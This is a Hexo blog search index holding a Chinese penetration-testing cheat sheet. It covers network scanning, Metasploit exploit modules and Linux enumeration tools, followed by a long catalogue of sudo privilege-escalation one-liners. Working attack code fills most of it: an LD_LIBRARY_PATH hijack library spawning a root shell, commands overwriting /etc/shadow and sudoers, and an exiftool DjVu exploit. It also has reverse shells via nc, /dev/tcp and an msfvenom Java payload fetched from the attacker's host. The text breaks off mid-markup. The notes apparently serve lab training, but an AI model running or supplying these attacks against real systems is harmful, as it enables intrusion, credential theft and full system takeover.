<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透笔记</title>
    <link href="/2025/04/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <url>/2025/04/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">cme smb &lt;ip_range&gt;  # 使用 CrackMapExec (cme) 扫描 SMB 存活主机<br>nmap -sP &lt;ip&gt;       # 使用 Nmap 进行 Ping 扫描（检测主机是否存活）<br>nmap -PN -sV --top-ports 50 --open &lt;ip&gt;  # 快速扫描：检测前 50 个常用端口，识别服务版本，仅显示开放端口<br>nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt;  # 检测 SMB 漏洞（针对端口 139 和 445）<br>nmap -PN -sC -sV &lt;ip&gt;  # 经典扫描：使用默认脚本（-sC）和服务版本检测（-sV）<br>nmap -PN -sC -sV -p- &lt;ip&gt;  # 全端口扫描：扫描所有端口（1-65535），使用默认脚本和服务版本检测<br>nmap -sU -sC -sV &lt;ip&gt;  # UDP 扫描：扫描 UDP 端口，使用默认脚本和服务版本检测<br>nmap -sT -p- &lt;ip&gt;      # TCP 全连接扫描：扫描所有 TCP 端口（1-65535）<br>nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.229.201# 快速扫描<br><br>nmap -sT -sV -sC -p 21,22,53,1337 10.200.78.101# 针对存活端口探测详细信息<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">两次扫描，先扫出开放端口，再对开放端口探测</span><br>target=10.10.236.185; nmap -T4 -p$(nmap -Pn -T4 -n -p- $target | grep &#x27;tcp.*open&#x27; | cut -d &#x27;/&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s/,$//) -Pn -n -sVC $target<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">先用rustscan快速探测，再用nmap查探开放端口详细信息</span><br>rustscan -a 10.10.153.136<br>nmap -sT -sV -sC -p 1883 10.10.153.136<br></code></pre></td></tr></table></figure><h2 id="漏洞快速探测利用"><a href="#漏洞快速探测利用" class="headerlink" title="漏洞快速探测利用"></a>漏洞快速探测利用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">exploit/multi/misc/java_rmi_server <span class="hljs-comment">#java rmi</span><br>exploit/windows/smb/ms17_010_eternalblue <span class="hljs-comment">#ms17-010</span><br>tomcat：auxiliary/scanner/http/tomcat_enum<span class="hljs-comment">#tomcat</span><br>exploit/multi/http/tomcat_mgr_deploy<span class="hljs-comment">#jboss manager</span><br>ysoserial  <span class="hljs-comment">#Java反序列化漏洞测试工具</span><br></code></pre></td></tr></table></figure><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="docker判断"><a href="#docker判断" class="headerlink" title="docker判断"></a>docker判断</h2><ol><li><code>df</code>命令的结果中包含<code>/sys/fs/cgroup</code>文件夹</li><li>以 <code>root@&lt;random_number&gt;</code> 身份登录，这可能是容器ID</li><li>在根目录<code>ls -lsa</code>可发现<code>.dockerenv</code>文件</li></ol><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">可能安装额外文件的目录</span><br>/usr/local <br>/opt<br><br>/etc/crontab# 计划任务<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">可用命令</span><br>/bin/<br>/usr/bin/<br></code></pre></td></tr></table></figure><p><a href="https://gtfobins.github.io/">GTFOBins linux的suid和sudo提权查询</a></p><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><p><a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></p><p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></p><h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><h3 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h3><p><a href="https://github.com/peass-ng/PEASS-ng">peass-ng/PEASS-ng: PEASS </a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#需要上传linpeas_linux_amd64</span><br><span class="hljs-built_in">chmod</span> +x linpeas_linux_amd64<br>./linpeas_linux_amd64<br><br><span class="hljs-comment">#或者直接</span><br>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh<br>curl -L http://10.2.26.216:8000/linpeas.sh | sh<br></code></pre></td></tr></table></figure><h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a><strong><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></strong></h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./LinEnum.sh</span><br><span class="hljs-string">./LinEnum.sh</span> -s -k keyword -r report -e <span class="hljs-string">/tmp/</span> -t<br></code></pre></td></tr></table></figure><h2 id="pspy64"><a href="#pspy64" class="headerlink" title="pspy64"></a>pspy64</h2><p>在没有 root 权限的情况下监控 Linux 进程<br>一般用于提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m http.server 8000<br>wget -P /tmp http://10.2.26.216:8000/pspy64<br>cd /tmp<br>chmod +x pspy64<br>./pspy64<br></code></pre></td></tr></table></figure><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -perm -4000 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null     <span class="hljs-comment"># 查找设置了SUID位的文件</span><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<span class="hljs-comment"># 等效，没加ls所以是列出简要信息</span><br></code></pre></td></tr></table></figure><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo -l    <span class="hljs-comment">#列出可以使用的sudo命令</span><br><br>sudo find /home -<span class="hljs-built_in">exec</span> /bin/bash \;    <span class="hljs-comment">#find</span><br>sudo mysql -e <span class="hljs-string">&#x27;\! /bin/sh&#x27;</span>        <span class="hljs-comment">#mysql  注意单引号</span><br></code></pre></td></tr></table></figure><h3 id="env-keep-LD-PRELOAD"><a href="#env-keep-LD-PRELOAD" class="headerlink" title="env_keep+=LD_PRELOAD"></a>env_keep+=LD_PRELOAD</h3><p><code>LD_PRELOAD</code> 是一个环境变量，允许用户在程序运行前告诉进程将共享对象加载到进程内存中。共享对象——以 <code>.so</code> 扩展名标识的文件——类似于 Windows <code>.dll</code> 文件，因为它包含可能对运行进程功能必要的代码。</p><p>我们可以在运行<code>sudo</code> 时指向一个自定义的 <code>.so</code> 文件，使 <code>.so</code> 文件作为 <code>root</code> 运行。通过指向一个自定义的 <code>.so</code> 文件路径，我们可以使进程任意加载恶意代码并在主程序运行之前执行它。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"> 使用 msfvenom创建 pwn.so， 为 saad 在所有命令上提供无密码的 sudo</span><br>msfvenom -p linux/x64/exec CMD=&quot;echo &#x27;saad        ALL=(ALL:ALL) NOPASSWD: ALL&#x27; &gt; /etc/sudoers.d/saad&quot; AppendExit=&#x27;true&#x27; -f elf-so -o pwn.so<br><br>sudo LD_PRELOAD=/tmp.pwn.so /usr/bin/ping# /usr/bin/ping为可以用sudo运行的命令<br></code></pre></td></tr></table></figure><h3 id="env-keep-LD-LIBRARY-PATH"><a href="#env-keep-LD-LIBRARY-PATH" class="headerlink" title="env_keep+=LD_LIBRARY_PATH"></a>env_keep+=LD_LIBRARY_PATH</h3><p>场景：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">rick@Hijack:/tmp$ sudo -l<br>[sudo] password for rick: <br>Matching Defaults entries for rick on Hijack:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH<br><br>User rick may run the following commands on Hijack:<br>    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2<br></code></pre></td></tr></table></figure><p>操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">ldd /usr/sbin/apache2# 列出可执行文件所需的共享库<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">在 /tmp 中创建一个恶意 C 程序（ malware.c ），以利用 libcrypt.so.1 库</span><br>cd /tmp<br>touch malware.c<br>nano malware.c<br></code></pre></td></tr></table></figure><p><code>malware.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">hijack</span><span class="hljs-params">()</span> __<span class="hljs-title function_">attribute__</span><span class="hljs-params">((constructor))</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack</span><span class="hljs-params">()</span> &#123;<br>        unsetenv(<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>);<br>        setresuid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>继续</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/malware.c# 编译生成共享库<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">just <span class="hljs-keyword">do</span> it</span><br>sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2<br></code></pre></td></tr></table></figure><h3 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h3><ul><li>sudo&lt;=1.8.28</li><li>运行sudo -l后显示当前用户可以免密切换至其他任意非root用户</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo -u<span class="hljs-comment">#-1 /bin/bash</span><br></code></pre></td></tr></table></figure><h3 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh<br></code></pre></td></tr></table></figure><h3 id="apt-get"><a href="#apt-get" class="headerlink" title="apt-get"></a>apt-get</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh<br></code></pre></td></tr></table></figure><h3 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apache2 -f /etc/shadow<br></code></pre></td></tr></table></figure><p>可能泄露root账号密码hash，尝试破解</p><h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ash<br>bash<br></code></pre></td></tr></table></figure><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;<br></code></pre></td></tr></table></figure><h3 id="base32-58-64-nc-z"><a href="#base32-58-64-nc-z" class="headerlink" title="base32/58/64/nc/z"></a>base32/58/64/nc/z</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">bossfrank=/etc/shadow<br>sudo base64 &quot;$bossfrank&quot; | base64 -d<br></code></pre></td></tr></table></figure><p>编码读取/etc/shadow文件</p><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p>利用复制的高权限，我们可以<strong>自己写一个shadow文件，通过复制操作覆盖原有的shadow文件</strong>，从而修改了root账户的密码，用新的密码进行提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>mkpasswd -m sha-512 123456   #生成sha-512加密（/etc/shadow中密码的加密方式）的密文企图把root账户的密码修改为123456<br>cat /etc/shadow | grep root  #可参考通常情况下shadow形式<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">靶机中</span><br>bossfrank=/etc/shadow      #声明环境变量指向/etc/shadow<br>TF=$(mktemp)               #声明一个名为TF的变量，指向用mktemp生成的临时文件<br>echo &#x27;root:$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.:18225:0:99999:7:::&#x27; &gt; $TF                 #将生成的shadow记录（即root账户密码是123456）写入TF变量<br>sudo /usr/bin/cp $TF $bossfrank     #使用sudo的cp复制指令，将shadow记录复制到/etc/shadow，实现覆盖操作<br></code></pre></td></tr></table></figure><h3 id="cpulimit"><a href="#cpulimit" class="headerlink" title="cpulimit"></a>cpulimit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo cpulimit -l 100 -f /bin/bash<br></code></pre></td></tr></table></figure><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>php -S 0:80  #启动一个http服务，将自定义shadow记录放进去<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">在靶机中</span><br>sudo curl http://kali的ip/shadow_entry -o /etc/shadow  #访问payload，把结果输出到/etc/shadow，覆盖靶机原/etc/shadow<br></code></pre></td></tr></table></figure><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo date -f /etc/shadow<br></code></pre></td></tr></table></figure><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;root:$6$xN1oF.DguPuEFNRA$AioCGARgZikdMFSmMygmnY5PmF7JDOKi5A/M9ESTsNKZvpWTYSku3f9atqjAEapxltWMve4iff82svVapfLUx.:18225:0:99999:7:::&quot; | sudo dd of=/etc/shadow    #覆盖靶机/etc/shadow，root密码为123456<br></code></pre></td></tr></table></figure><h3 id="dstat"><a href="#dstat" class="headerlink" title="dstat"></a>dstat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name dstat -type f 2&gt;/dev/null    #找到dstat的插件目录<br>echo &#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27; &gt;/usr/local/share/dstat/dstat_exp.py     #在目录中写入py提权脚本<br>sudo dstat --exp    #&quot;exp&quot;与上条&quot;dstat_exp.py&quot;对应<br></code></pre></td></tr></table></figure><h3 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ed       #进入文本编辑界面<br>!/bin/bash       #进入后输入<br></code></pre></td></tr></table></figure><h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo env /bin/sh<br></code></pre></td></tr></table></figure><h3 id="exiftools"><a href="#exiftools" class="headerlink" title="exiftools"></a>exiftools</h3><p>7.44&lt;=exiftool&lt;=12.23</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo  &quot;(metadata \&quot;\c$&#123;system(&#x27;/bin/bash&#x27;)&#125;;\&quot;)&quot; &gt; payload  #构造payload，并在里面写入源数据<br>(metadata &quot;\c$&#123;system(&#x27;/bin/bash&#x27;)&#125;;&quot;)    #与上条功能相同，两者执行其一即可<br>bzz payload payload.bzz    #使用bzz工具进行压缩<br>djvumake exploit.djvu INFO=&#x27;1,1&#x27; BGjp=/dev/null ANTz=payload.bzz    #用djvumake工具生成利用文件exploit.djvu<br>sudo exiftool exploit.djvu<br></code></pre></td></tr></table></figure><h3 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo expect -c &#x27;spawn /bin/bash;interact&#x27;<br></code></pre></td></tr></table></figure><h3 id="fail2ban"><a href="#fail2ban" class="headerlink" title="fail2ban"></a>fail2ban</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">find -name &quot;fail2ban*&quot; -type d 2&gt;/dev/null   #查找fail2ban的目录<br>find /etc/fail2ban -writable -type d 2&gt;/dev/null   #列出可写目录<br>mv iptables-multport.conf iptables-multport.conf.bak   #将原本的配置文件改名<br>cp iptables-multport.conf.bak iptables-multport.conf   #复制文件，此时iptables-multport.conf已可编辑<br>actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc kali的ip 1234 &gt; /tmp/f  #在iptables-multport.conf写入该行，用于反弹shell<br>sudo /etc/init.d/fail2ban restart  #重启fail2ban服务，确保配置修改生效<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>nc -lvnp 1234    #监听<br></code></pre></td></tr></table></figure><p>只需再次ssh尝试登录某个账户，并故意短时间内快速多次用错误密码尝试（具体需要多快可以查看文件/etc/fail2ban/jail.conf）</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo find . -exec /bin/bash \; -quit<br></code></pre></td></tr></table></figure><h3 id="flock"><a href="#flock" class="headerlink" title="flock"></a>flock</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo flock -u / /bin/bash<br></code></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo ftp<br>!/bin/sh<br></code></pre></td></tr></table></figure><h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gcc -wrapper /bin/bash,-s .<br></code></pre></td></tr></table></figure><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gdb -nx -ex &#x27;!bash&#x27; -ex quit<br></code></pre></td></tr></table></figure><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo git branch --help<br>!/bin/bash<br></code></pre></td></tr></table></figure><h3 id="gzip-gunzip"><a href="#gzip-gunzip" class="headerlink" title="gzip/gunzip"></a>gzip/gunzip</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gzip -f /etc/shadow -t<br></code></pre></td></tr></table></figure><p>运行后会暴露/etc/shadow文件的内容</p><h3 id="iftop"><a href="#iftop" class="headerlink" title="iftop"></a>iftop</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo iftop<br>！/bin/bash<br></code></pre></td></tr></table></figure><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo hping3<br>/bin/bash<br></code></pre></td></tr></table></figure><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>msfvenom -p java/shell_reverse_tcp LHOST=kali的ip LPORT=1234 -f jar -o shell.jar  #用msfvenom生成java的反弹shell<br>php -S 0:80    #在相应目录开启http服务<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">在靶机中</span><br>wget http://kali的ip/shell.jar     #下载payload<br>java -jar shell.jar<br></code></pre></td></tr></table></figure><h3 id="jjs"><a href="#jjs" class="headerlink" title="jjs"></a>jjs</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在kali中</span><br>nc -lvnp 1234<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">靶机</span><br>echo &quot;Java.type(&#x27;java.lang.Runtime&#x27;).getRuntime().exec([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;exec 5&lt;&gt;/dev/tcp/kali的ip/1234;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#x27;]).waitFor()&quot; | sudo jjs   #反弹shell<br></code></pre></td></tr></table></figure><h3 id="journalctl"><a href="#journalctl" class="headerlink" title="journalctl"></a>journalctl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo journalctl<br>!/bin/bash<br></code></pre></td></tr></table></figure><h3 id="knife"><a href="#knife" class="headerlink" title="knife"></a>knife</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo knife exec -E &#x27;exec &quot;/bin/bash&quot;&#x27;<br></code></pre></td></tr></table></figure><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mktemp ./XXX   #建立一个临时文件<br>sudo less tE70f   #&quot;tE70f&quot;为临时文件的名字，用sudo less读取此临时文件<br>!/bin/bash<br></code></pre></td></tr></table></figure><p>也可以直接随便读取个文件，然后输入!/bin/bash</p><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo man ls #用sudo man随便查看一个linux命令<br>!/bin/bash<br></code></pre></td></tr></table></figure><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mktemp ./xxx<br>yes bossfrank &gt; 7aADd   #设bossfrank是一个已有的文件<br>sudo more 7aADd<br>!/bin/bash<br></code></pre></td></tr></table></figure><h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo mount -o bind /bin/bash /bin/mount<br>sudo mount<br></code></pre></td></tr></table></figure><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo mysql -e &#x27;\! /bin/sh&#x27;<br></code></pre></td></tr></table></figure><h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo nano<br>reset;bash 1&gt;&amp;0 2&gt;&amp;0<br></code></pre></td></tr></table></figure><h3 id="neofetch"><a href="#neofetch" class="headerlink" title="neofetch"></a>neofetch</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">TF=$(mktemp)   #声明一个变量TF，指向一个新建的临时文件<br>echo &#x27;exec /bin/bash&#x27; &gt;$TF   # 将提权逻辑写入临时文件中<br>sudo neofetch --config $TF<br></code></pre></td></tr></table></figure><h3 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h3><figure class="highlight shell"><table><tr><td 